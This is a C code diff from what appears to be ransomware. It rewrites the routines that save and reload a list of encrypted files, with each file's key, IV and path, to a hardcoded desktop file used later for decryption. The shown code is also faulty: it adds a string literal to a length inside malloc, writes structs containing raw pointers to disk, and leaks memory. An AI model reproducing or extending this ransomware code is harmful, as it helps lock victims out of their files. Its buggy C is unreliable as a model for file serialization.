@@ -73,15 +73,27 @@ void find_files(List **files, char* start_path){
 void save_into_file_encrypted_list(List *l, char * start_path){
     FILE *f;
     char * new_file;
-    new_file = (char*)malloc(strlen(start_path) + "enc_files.gc" + 1);
-    strcpy(new_file, start_path);
-    strcat(new_file, "enc_files.gc");
-    f = fopen(new_file, "wb");
     int status;
+    int tam;
+    List aux;
+    aux.info[0] = (char *)malloc(33);
+    aux.info[1] = (char *)malloc(17);
+    new_file = (char*)malloc(strlen(start_path) + "enc_files.gc" + 1);
+    //strcpy(new_file, start_path);
+    //strcat(new_file, "enc_files.gc");
+    strcpy(new_file,"/home/tarcisio/Desktop/enc_files.gc");
+    f = fopen(new_file, "wb");
 
     while(l != NULL){
-
-        status = fwrite(l, sizeof(List), 1, f);
+        tam = strlen(l->info[2]);
+        aux.info[2] = (char *)malloc(tam+1);
+        strcpy(aux.info[0], l->info[0]);
+        strcpy(aux.info[1], l->info[1]);
+        strcpy(aux.info[2], l->info[2]);
+        status = fwrite(&aux, sizeof(List), 1, f);
+        memset(aux.info[0], 0, 33);
+        memset(aux.info[1], 0, 17);
+        memset(aux.info[2], 0, tam);
         l = l->prox;
     }
     free(new_file);
@@ -93,14 +105,16 @@ void save_into_file_encrypted_list(List *l, char * start_path){
  * and path from each successfull encrypted file on the machine
  * Is used to append to the list all the encrypted files.
  * This list will be used to decrypt the files.
- * @param l -> type = EncList
+ * @param l -> type = List
  */
 void read_from_file_encrypted_files(List **l, char * start_path){
     FILE *f;
-    List *temp;
+    List temp;
     int status;
     char *key, *iv, *path;
-    strcat(start_path, "enc_files.gc");
+
+    char * new_file = "/home/tarcisio/Desktop/enc_files.gc";
+    //strcat(start_path, "enc_files.gc");
 
     if(*l != NULL){
         destroy(l);
@@ -118,8 +132,7 @@ void read_from_file_encrypted_files(List **l, char * start_path){
                         return;
                     }
                 }
-                append(l, temp->info[2], temp->info[0], temp->info[1]);
-                free(temp);
+                append(l, temp.info[2], temp.info[0], temp.info[1]);
             }
 
             fclose(f);
